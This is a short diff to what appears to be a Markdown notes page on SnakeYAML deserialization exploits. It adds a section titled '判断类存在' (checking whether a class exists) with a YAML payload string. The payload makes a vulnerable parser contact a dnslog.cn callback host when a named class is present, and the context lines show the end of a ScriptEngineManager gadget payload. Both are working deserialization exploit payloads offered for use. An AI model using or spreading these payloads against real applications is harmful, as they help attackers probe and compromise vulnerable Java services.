@@ -14,3 +14,8 @@ String data2 = "!!javax.script.ScriptEngineManager [\n" +
                 "  ]]\n" +
                 "]";
 ```
+
+## 判断类存在
+```java
+ String poc = "[!!判断的类全类名 []: 0, !!java.net.URL [null, \"http://ixvoxg.dnslog.cn\"]: 1]";
+```
